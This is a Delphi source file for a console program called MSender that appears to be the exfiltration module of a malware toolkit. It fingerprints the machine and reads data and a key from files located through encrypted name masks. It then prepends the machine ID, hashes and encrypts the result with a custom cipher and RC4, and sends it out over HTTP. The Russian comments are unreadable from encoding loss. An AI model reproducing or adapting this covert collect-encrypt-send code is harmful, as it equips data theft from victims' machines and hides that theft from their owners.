program MSender;
{$I MSender.inc}

{$APPTYPE CONSOLE}

uses
  SysUtils,
  Classes,
  Crypto in '..\Shared\Crypto.pas',
  MachineID in '..\Shared\MachineID.pas',
  Patterns in '..\Shared\Patterns.pas',
  GlobalVar in 'GlobalVar.pas',
  PayLoad in 'PayLoad.pas',
  md5Module in 'md5Module.pas',
  uRC4 in 'uRC4.pas',
  PhpCrypt in 'PhpCrypt.pas',
  HttpWrk in 'HttpWrk.pas';

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
var
  ID,
  WrkFileName,
  plain_data, hash, chunk, key: string;
begin
  MakeInternalKeys;

 { ���������� ����� ���������� }
  if not KeysFromGUID(STRING_CRYPTO_KEY, gK1, gK2, gK3) then
    begin
    {$IFDEF DBG_OUTPUT}
      WriteLn('GenKeys failed!');
    {$ENDIF}
      Halt(11);
    end;

 { ���������� ID }
  ID := MakeMachineID_2;
{$IFDEF DBG_OUTPUT}
  WriteLn('MachineID: ' + ID);
{$ENDIF}

  if ID = '' then
     Halt(12);

  WrkFileName := GetWorkFileName(DecStr(FL_MASK1));
  if WrkFileName = '' then
     Halt(1);

  plain_data := '';
  with TFileStream.Create(WrkFileName, fmOpenRead) do begin
    if Size <> 0 then
    begin
      SetLength(plain_data, Size);
      Read(plain_data[1], Size);
    end;
    Free;
  end;
  if plain_data = '' then
     Halt(1);

  WrkFileName := GetWorkFileName(DecStr(FL_MASK2));
  if WrkFileName = '' then
     Halt(2);
  key := '';
  with TStringList.Create do begin
    LoadFromFile(WrkFileName);
    if Count > 0 then
       key := Strings[0];
    Free;
  end;
  if key = '' then
     Halt(2);

 { ��������� ����� }
  plain_data := ID + #13#10 + plain_data;
  hash  := md5(plain_data);
  chunk := MakeChunk(plain_data, hash);
  chunk := visualEncrypt(chunk);
  chunk := RC4(chunk, key);

 { �������� }
  SendData(chunk); 

end.
